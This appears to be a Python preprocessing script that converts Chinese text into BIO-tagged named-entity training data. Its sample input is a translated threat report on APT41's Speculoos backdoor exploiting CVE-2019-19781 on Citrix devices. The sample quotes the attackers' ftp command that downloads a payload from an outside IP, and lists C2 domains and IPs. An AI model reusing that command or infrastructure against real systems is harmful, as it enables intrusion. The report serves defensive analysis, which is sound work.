# -*- coding: utf-8 -*-
# @Time    : 2020/6/22 16:19
# @Author  : piguanghua
# @FileName: clean_ner.py
# @Software: PyCharm

'''
文本转成ner训练文件
'''

import csv
import jieba
import jieba.posseg as pseg
import re
import codecs

#jieba.enable_parallel(80)

if __name__ == '__main__':
    tag_file = "/Users/piguanghua/Downloads/nitsc_keywords.txt"
    fout1 = open('/Users/piguanghua/Downloads/example.dev', 'w', encoding='utf8')

    tag_list = []
    with codecs.open(tag_file) as fin:
        for lidx, line in enumerate(fin):
            tag_list.append(line.split("\n")[0])

    for ele in tag_list:
        jieba.add_word(ele, tag="SER")

    biaoji = ["SER"]
    fuhao = ['；', '。', '?', '？', '!', '！', ';']
    
    ss = "文章目录攻击细节二进制分析影响评估IOCsSpeculoos SHA256Network 2020年3月25日，FireEye发表了APT41全球攻击活动报告。此攻击活动发生在1月20日至3月11日期间，主要对Citrix，Cisco和Zoho网络设备进行攻击。研究人员根据WildFire和AutoFocus数据获得了针对Citrix设备的攻击样本‘Speculoos’，还确定了北美，南美和欧洲等世界各地多个行业的受害者。 Speculoos的基于FreeBSD实现的，共识别出五个样本，所有样本文件大小基本相同，样本集之间存在微小差异。Speculoos利用CVE-2019-19781进行攻击传播，CVE-2019-19781影响Citrix Application Delivery Controller，Citrix Gateway和Citrix SD-WAN WANOP等设备，允许攻击者远程执行任意命令。 攻击细节 攻击者利用CVE-2019-19781远程执行命令：’/usr/bin/ftp -o /tmp/bsd ftp://test：[redacted]\@ 66.42.98[.]220/<filename>’。 第一波攻击始于2020年1月31日晚上，使用的文件名为bsd，影响了美国的多个高等教育机构，美国医疗机构和爱尔兰咨询公司。第二波攻击始于2020年2月24日，使用文件名为un，影响了哥伦比亚高等教育机构，奥地利制造组织，美国高等教育机构以及美国的州政府。 基于BSD系统的恶意软件相对少见，此工具和特定Citrix网络设备有关，因此Speculoos很可能是APT41组织专为此攻击活动研发的。 二进制分析 Speculoos后门是使用GCC 4.2.1编译的ELF可执行文件，可在FreeBSD系统上运行。 该负载无法保持持对目标持久控制，因此攻击者会使用额外的组件或其他攻击手段维持控制。 后门执行后将进入循环，该循环调用函数通过443端口与C2域进行通信： alibaba.zzux[.]com (119.28.139[.]120) 如果无法通信，Speculoos会尝试通过443端口与119.28.139[.]20上的备份C2通信。如果连接到任一C2服务器，它将与服务器进行TLS握手。 图1显示了发送到C2服务器的数据包。 它请求login.live [.] com作为Server Name Indication（SNI）。 它请求login.live [.] com作为Server Name Indication（SNI）。 成功连接到C2并完成TLS握手后，Speculoos将对目标系统进行指纹识别，并将数据发送回C2服务器。其结构如下表1所示。 成功连接到C2并完成TLS握手后，Speculoos将对目标系统进行指纹识别，并将数据发送回C2服务器。其结构如下表1所示。 数据通过TLS通道发送，并且Speculoos会等待服务器的两字节响应。 收到响应后，它将向C2发送一个字节（0xa），并进入循环等待命令。 表2为攻击者可执行命令， 可让攻击者完全控制受害者系统。 数据通过TLS通道发送，并且Speculoos会等待服务器的两字节响应。 收到响应后，它将向C2发送一个字节（0xa），并进入循环等待命令。 表2为攻击者可执行命令， 可让攻击者完全控制受害者系统。 研究中分析的两个Speculoos样本在功能上相同，两者之间只有八个字节不同，在收集系统信息时‘hostname‘和‘uname -s’命令不同导致。uname -s返回内核信息，hostname返回主机系统名称。 下图显示了两个Speculoos样本之间的二进制比较。 研究中分析的两个Speculoos样本在功能上相同，两者之间只有八个字节不同，在收集系统信息时‘hostname‘和‘uname -s’命令不同导致。uname -s返回内核信息，hostname返回主机系统名称。 下图显示了两个Speculoos样本之间的二进制比较。 影响评估 互联网可访问设备允许未经授权的用户远程执行代会带来很大的安全问题，CVE-2019-19781影响了多个面向互联网的设备，攻击者积极利用此漏洞来安装自定义后门。受影响组织大量的网络活动都必须经过这些网络设备，攻击者可以监视或修改整个组织的网络活动。 默认情况下通过这些设备可以直接访问组织系统内部，攻击者无需考虑内部网络横向移动的问题。攻击者可以修改网络流量，注入恶意代码，执行中间人攻击，或将用户重定向到虚假登录页面来收集登录凭证。 IOCs Speculoos SHA256 99c5dbeb545af3ef1f0f9643449015988c4e02bf8a7164b5d6c86f67e6dc2d28 6943fbb194317d344ca9911b7abb11b684d3dca4c29adcbcff39291822902167 493574e9b1cc618b1a967ba9dabec474bb239777a3d81c11e49e7bb9c71c0c4e 85297097f6dbe8a52974a43016425d4adaa61f3bdb5fcdd186bfda2255d56b3d c2a88cc3418b488d212b36172b089b0d329fa6e4a094583b757fdd3c5398efe1 Network 119.28.139[.]20 alibaba.zzux[.]com 119.28.139[.]120 66.42.98[.]220 exchange.longmusic[.]com *参考来源：unit42，由Kriston编译，转载请注明来自FreeBuf.COM"
    res = pseg.lcut(ss, HMM=False)
    line_seg = res
    '''
    for k, v in res:
        print("k,v pair is %s,%s" % (k, v))
    '''
    index = '1'
    
    for key, value in line_seg:
        if value.strip() and key.strip():

            if value not in biaoji:
                value = 'O'
                for achar in key.strip():
                    if achar and achar.strip() in fuhao:
                        string = achar + " " + value.strip() + "\n" + "\n"
                        if index == '1':
                            #print("{0} fout1 {1}".format(value, string))
                            fout1.write(string)
                        else:
                            pass
                    elif achar.strip() and achar.strip() not in fuhao:
                        string = achar + " " + value.strip() + "\n"
                        if index == '1':
                            #print("{0} fout1 {1}".format(value, string))
                            fout1.write(string)
                        else:
                            pass
                    else:
                        continue

            elif value.strip() in biaoji:
                begin = 0
                for char in key.strip():
                    if begin == 0:
                        begin += 1
                        string = char + ' ' + 'B-' + value.strip() + '\n'
                        if index == '1':
                            #print("{0} fout1 {1}".format(value, string))
                            fout1.write(string)
                        else:
                            pass
                    else:
                        string = char + ' ' + 'I-' + value.strip() + '\n'
                        if index == '1':
                            #print("{0} fout1 {1}".format(value, string))
                            fout1.write(string)
                        else:
                            pass
            else:
                continue




